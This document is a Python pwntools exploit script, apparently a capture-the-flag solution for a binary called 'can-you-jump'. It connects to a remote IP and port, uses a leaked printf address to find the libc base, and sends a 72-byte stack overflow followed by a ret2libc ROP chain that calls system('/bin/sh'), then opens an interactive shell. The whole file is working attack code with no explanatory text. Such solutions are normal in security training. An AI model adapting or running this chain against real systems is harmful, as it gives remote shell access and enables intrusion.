from pwn import *

exe = './can-you-jump'
elf = ELF(exe)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.27.so')

context.binary = elf

HOST = '34.159.240.221'
PORT = 32103

#p = process(exe)

p = connect(HOST,PORT)
p.recvuntil(b'address : ')
leak_str = p.recvline().strip().decode()

printf_leak = int(leak_str,16)
log.success(f"Printf Leaked: {hex(printf_leak)}")

libc.address = printf_leak - libc.symbols['printf']
log.success(f"Libc address: {hex(libc.address)}")

rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
print(f"POP RDI gadget: {hex(pop_rdi)}")

bin_sh = next(libc.search(b'/bin/sh'))
print(f"'/bin/sh' address: {hex(bin_sh)}")

system_addr = libc.symbols['system']
print(f"System address: {hex(system_addr)}")

ret_gadget = rop.find_gadget(['ret'])[0]

offset = 72

payload = flat(
    b'A' * offset,
    ret_gadget,
    pop_rdi,
    bin_sh,
    system_addr
)

p.sendline(payload)
p.interactive()

